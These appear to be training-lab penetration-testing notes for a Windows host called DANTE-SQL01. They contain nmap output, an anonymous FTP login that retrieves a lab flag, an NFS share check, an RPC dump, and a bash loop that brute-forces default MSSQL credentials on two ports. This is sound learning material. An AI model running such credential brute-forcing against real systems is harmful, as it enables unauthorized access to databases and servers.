Nmap:
```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   172.16.1.5:1433: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-25T03:29:27
| Not valid after:  2055-11-25T03:29:27
| MD5:   07b9:4829:ac2f:cc17:5460:0429:710a:8494
|_SHA-1: 573a:21ec:bcf9:2332:a604:2bd0:0d45:5da0:1b6f:9e63
| ms-sql-info: 
|   172.16.1.5:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-25T22:41:03+00:00; +44s from scanner time.
2049/tcp  open  nlockmgr     1-4 (RPC #100021)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   172.16.1.5:49673: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49673
| ms-sql-ntlm-info: 
|   172.16.1.5:49673: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
|_ssl-date: 2025-11-25T22:41:03+00:00; +44s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-25T03:29:27
| Not valid after:  2055-11-25T03:29:27
| MD5:   07b9:4829:ac2f:cc17:5460:0429:710a:8494
|_SHA-1: 573a:21ec:bcf9:2332:a604:2bd0:0d45:5da0:1b6f:9e63
49678/tcp open  msrpc        Microsoft Windows RPC
49679/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
```

# FTP

Flag: FTP login with `anonymous:anonymous`:
```bash
proxychains ftp anonymous@172.16.1.5
# anonymous

get flag.txt
# DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}
```

# NFS

Any exported NFS shares?
```bash
proxychains showmount -e 172.16.1.5
# Export list for 172.16.1.5:
```
=> nope

# MSSQL 

Brute force default creds (https://raw.githubusercontent.com/gauravnarwani97/MsSQL-default-credentials/refs/heads/master/default_db_credentials1.txt).

MSSQL Port 1433:
```bash
while IFS= read -r creds; do
	echo "==============================="
	echo "Creds: $creds"
	proxychains impacket-mssqlclient $creds@172.16.1.5
done < default_db_credentials1.txt | tee mssql_p1433.brute.txt
```
=> nothing

MSSQL Port 49673:
```bash
while IFS= read -r creds; do
	echo "==============================="
	echo "Creds: $creds"
	proxychains impacket-mssqlclient $creds@172.16.1.5 -port 49673
done < default_db_credentials1.txt | tee mssql_p49673.brute.txt
```
=> nothing

# RPC

Enumerate RPC services:
```bash
proxychains impacket-rpcdump 172.16.1.5 | tee rpc_services.txt
```